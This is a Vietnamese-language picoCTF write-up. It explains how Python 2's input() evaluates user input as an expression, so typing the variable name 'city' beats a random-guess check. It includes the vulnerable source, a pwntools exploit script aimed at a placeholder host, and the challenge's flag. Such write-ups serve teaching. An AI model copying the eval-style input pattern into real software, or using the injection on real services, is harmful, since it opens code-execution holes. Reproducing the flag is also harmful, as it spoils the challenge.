# picoCTF Write-up: Python 2 `input()` Vulnerability

## Thông tin bài

- Dạng bài: Python / Code Injection
- Ngôn ngữ: Python 2.7
- Lỗi chính: sử dụng `input()` trong Python 2
- Flag:

```text
picoCTF{v4lua4bl3_1npu7_5c99375e}
```

---

## Source code

```python
#!/usr/bin/python2.7 -u
import random

cities = open("./city_names.txt").readlines()
city = random.choice(cities).rstrip()
year = 2018

print("What's your favorite number?")
res = None
while not res:
    try:
        res = input("Number? ")
        print("You said: {}".format(res))
    except:
        res = None

if res != year:
    print("Okay...")
else:
    print("I agree!")

print("What's the best city to visit?")
res = None
while not res:
    try:
        res = input("City? ")
        print("You said: {}".format(res))
    except:
        res = None

if res == city:
    print("I agree!")
    flag = open("./flag").read()
    print(flag)
else:
    print("Thanks for your input!")
```

---

## Phân tích chương trình

Chương trình đọc danh sách thành phố từ file `city_names.txt`, sau đó chọn ngẫu nhiên một thành phố:

```python
cities = open("./city_names.txt").readlines()
city = random.choice(cities).rstrip()
```

Giá trị thành phố cần đoán được lưu trong biến `city`.

Sau đó chương trình hỏi người dùng hai lần:

1. Nhập số yêu thích.
2. Nhập thành phố tốt nhất để ghé thăm.

Ở phần kiểm tra cuối, nếu giá trị nhập vào bằng đúng biến `city`, chương trình sẽ in flag:

```python
if res == city:
    print("I agree!")
    flag = open("./flag").read()
    print(flag)
```

Nhìn ban đầu thì có vẻ ta cần đoán đúng thành phố được chọn ngẫu nhiên. Tuy nhiên bài này có lỗi nghiêm trọng ở cách đọc input.

---

## Lỗ hổng

Chương trình sử dụng `input()` của Python 2:

```python
res = input("City? ")
```

Trong Python 2, `input()` không chỉ đọc chuỗi bình thường. Nó sẽ đọc dữ liệu người dùng nhập vào, sau đó đánh giá dữ liệu đó như một biểu thức Python.

Có thể hiểu đơn giản:

```python
input("City? ")
```

gần tương đương với:

```python
eval(raw_input("City? "))
```

Nghĩa là nếu ta nhập:

```python
1 + 2
```

thì chương trình sẽ hiểu là biểu thức Python và trả về:

```python
3
```

Nếu ta nhập:

```python
city
```

thì chương trình sẽ lấy giá trị của biến `city` đang tồn tại trong chương trình.

Đây chính là lỗi của bài.

---

## Ý tưởng khai thác

Ta không cần đoán thành phố thật sự là gì.

Vì biến `city` đã tồn tại trong chương trình, ta chỉ cần nhập trực tiếp tên biến:

```python
city
```

Khi đó dòng này:

```python
res = input("City? ")
```

sẽ hoạt động giống như:

```python
res = eval("city")
```

Do đó `res` sẽ nhận đúng giá trị của biến `city`.

Sau đó điều kiện:

```python
if res == city:
```

sẽ luôn đúng, vì bản chất là đang so sánh giá trị của `city` với chính nó.

---

## Khai thác thủ công

Khi chương trình hỏi số:

```text
What's your favorite number?
Number?
```

Ta nhập một số bất kỳ, ví dụ:

```text
1
```

Sau đó chương trình hỏi thành phố:

```text
What's the best city to visit?
City?
```

Ta nhập:

```text
city
```

Payload đầy đủ:

```text
1
city
```

Kết quả chương trình sẽ in flag:

```text
picoCTF{v4lua4bl3_1npu7_5c99375e}
```

---

## Script exploit

```python
from pwn import *

# Local
# p = process("./vuln.py")

# Remote
p = remote("HOST", PORT)

p.recvuntil("Number? ")
p.sendline("1")

p.recvuntil("City? ")
p.sendline("city")

p.interactive()
```

Khi chạy remote, thay `HOST` và `PORT` bằng thông tin server của bài.

---

## Vì sao không cần ghi đè thư viện `random`?

Ban đầu có thể nghĩ rằng cần can thiệp vào thư viện `random` để kiểm soát giá trị được chọn bởi:

```python
city = random.choice(cities).rstrip()
```

Nhưng thực tế không cần làm vậy.

Lý do là chương trình đã lưu kết quả random vào biến `city`, và lỗi `input()` trong Python 2 cho phép ta truy cập trực tiếp biến này bằng cách nhập tên biến:

```python
city
```

Do đó thay vì kiểm soát quá trình random, ta tận dụng lỗi `eval()` ngầm bên trong `input()` để lấy đúng giá trị đã được chọn.

---

## Kết luận

Bài này khai thác lỗi sử dụng `input()` trong Python 2.

Trong Python 2:

```python
input()
```

sẽ đánh giá dữ liệu nhập vào như biểu thức Python, tương tự:

```python
eval(raw_input())
```

Vì vậy người dùng có thể nhập tên biến, gọi hàm, hoặc thực thi biểu thức Python hợp lệ.

Payload chính của bài:

```text
city
```

Payload này khiến chương trình tự lấy giá trị biến `city`, từ đó vượt qua điều kiện kiểm tra và in flag.

